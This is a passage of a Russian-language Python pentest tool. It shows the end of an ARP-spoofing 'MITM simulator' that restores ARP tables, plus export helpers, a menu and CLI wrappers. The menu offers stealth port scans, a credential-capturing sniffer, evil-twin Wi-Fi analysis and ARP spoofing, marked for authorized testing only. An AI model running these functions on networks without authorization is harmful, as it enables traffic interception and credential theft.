            time.sleep(1.5)
    except KeyboardInterrupt:
        console.print("\n[yellow]Восстанавливаю ARP-таблицы...[/yellow]")
        for _ in range(5):
            sendp(Ether(dst=target_mac) / ARP(
                op=2, pdst=target_ip, hwdst=target_mac,
                psrc=gateway_ip, hwsrc=gateway_mac),
                iface=interface, verbose=False)
            sendp(Ether(dst=gateway_mac) / ARP(
                op=2, pdst=gateway_ip, hwdst=gateway_mac,
                psrc=target_ip, hwsrc=target_mac),
                iface=interface, verbose=False)
        console.print("[green]✓ ARP-таблицы восстановлены.[/green]")

    db.save_scan("mitm_sim", f"{target_ip}|{gateway_ip}",
                 {"interface": interface, "packets": packets_sent})


# ===========================================================================
# Экспорт
# ===========================================================================

def export_json(data: Any, name: str,
                path: str | None = None) -> Path | None:
    if not path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe = re.sub(r"[^A-Za-z0-9._-]", "_", name)[:40]
        path = str(NET_DIR / f"net_{safe}_{ts}.json")
    try:
        Path(path).write_text(
            json.dumps(data, indent=2, ensure_ascii=False, default=str),
            encoding="utf-8")
        console.print(f"[green]✓ JSON: {path}[/green]")
        return Path(path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]JSON: {exc}[/red]")
        return None


def export_csv(data: list[dict], name: str,
               path: str | None = None) -> Path | None:
    if not data:
        console.print("[yellow]Нет данных для экспорта.[/yellow]")
        return None
    if not path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe = re.sub(r"[^A-Za-z0-9._-]", "_", name)[:40]
        path = str(NET_DIR / f"net_{safe}_{ts}.csv")
    try:
        keys: set[str] = set()
        for d in data:
            keys.update(d.keys())
        keys_sorted = sorted(keys)
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=keys_sorted,
                               extrasaction="ignore")
            w.writeheader()
            for d in data:
                w.writerow(d)
        console.print(f"[green]✓ CSV: {path}[/green]")
        return Path(path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]CSV: {exc}[/red]")
        return None


def export_html(data: Any, name: str,
                path: str | None = None) -> Path | None:
    if not path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe = re.sub(r"[^A-Za-z0-9._-]", "_", name)[:40]
        path = str(NET_DIR / f"net_{safe}_{ts}.html")
    try:
        parts = [
            "<!DOCTYPE html><html lang='ru'><head><meta charset='utf-8'>",
            f"<title>Network — {html_mod.escape(name)}</title>",
            "<style>body{background:#0a0a0a;color:#c8c8c8;"
            "font-family:monospace;padding:24px;line-height:1.5;}",
            "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
            "pre{background:#111;padding:12px;border:1px solid #222;"
            "color:#a0ffa0;overflow-x:auto;}",
            "</style></head><body>",
            f"<h1>🌐 {html_mod.escape(name)}</h1>",
            f"<p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
            "<pre>",
            html_mod.escape(json.dumps(data, indent=2,
                                        ensure_ascii=False,
                                        default=str)[:50000]),
            "</pre></body></html>",
        ]
        Path(path).write_text("\n".join(parts), encoding="utf-8")
        console.print(f"[green]✓ HTML: {path}[/green]")
        return Path(path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]HTML: {exc}[/red]")
        return None


# ===========================================================================
# Menu
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]🌐 Network Analysis Pro[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "Список интерфейсов (детально)"),
        ("2", "ARP-скан сети (+ vendor lookup)"),
        ("3", "Port scan (SYN/connect/FIN/XMAS/NULL/ACK)"),
        ("4", "Packet sniffer (HTTP/DNS/creds)"),
        ("5", "MITM detector (ARP-спуфинг)"),
        ("6", "DNS spoof detector"),
        ("7", "Wi-Fi analyzer (+ evil twin)"),
        ("8", "MITM simulator (ARP-спуфинг, CTF)"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для авторизованного пентеста.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        list_interfaces()
    elif c == "2":
        arp_scan()
    elif c == "3":
        tgt = Prompt.ask("Target IP/host")
        ports = Prompt.ask("Порты (1-1024 или 22,80,443)",
                            default="1-1024")
        mode = Prompt.ask("Режим",
                          choices=list(SCAN_MODES.keys()),
                          default="connect")
        th = IntPrompt.ask("Threads", default=100)
        port_scan(tgt, ports, mode, th)
    elif c == "4":
        cnt = IntPrompt.ask("Сколько пакетов", default=50)
        pcap = Prompt.ask("PCAP файл (пусто = не сохранять)",
                          default="")
        bpf = Prompt.ask("BPF filter (пусто = всё)", default="")
        packet_sniffer(count=cnt, out_pcap=pcap or None, bpf_filter=bpf)
    elif c == "5":
        dur = IntPrompt.ask("Длительность (сек)", default=20)
        mitm_detector(duration=dur)
    elif c == "6":
        dur = IntPrompt.ask("Длительность (сек)", default=20)
        dns_spoof_detector(duration=dur)
    elif c == "7":
        wifi_analyzer()
    elif c == "8":
        mitm_simulator()


# ===========================================================================
# CLI wrappers (сохранены для main.py/tui/app.py)
# ===========================================================================

def cli_interfaces() -> None:
    list_interfaces()


def cli_arp(network: str | None = None) -> None:
    arp_scan(network=network)


def cli_ports(target: str, ports: str = "1-1024",
              mode: str = "connect") -> None:
    port_scan(target, ports, mode)


def cli_sniff(count: int = 50, interface: str | None = None) -> None:
    packet_sniffer(interface=interface, count=count)


def cli_mitm(duration: int = 20) -> None:
    mitm_detector(duration=duration)


def cli_dns_spoof(duration: int = 20) -> None:
    dns_spoof_detector(duration=duration)


def cli_wifi() -> None:
    wifi_analyzer()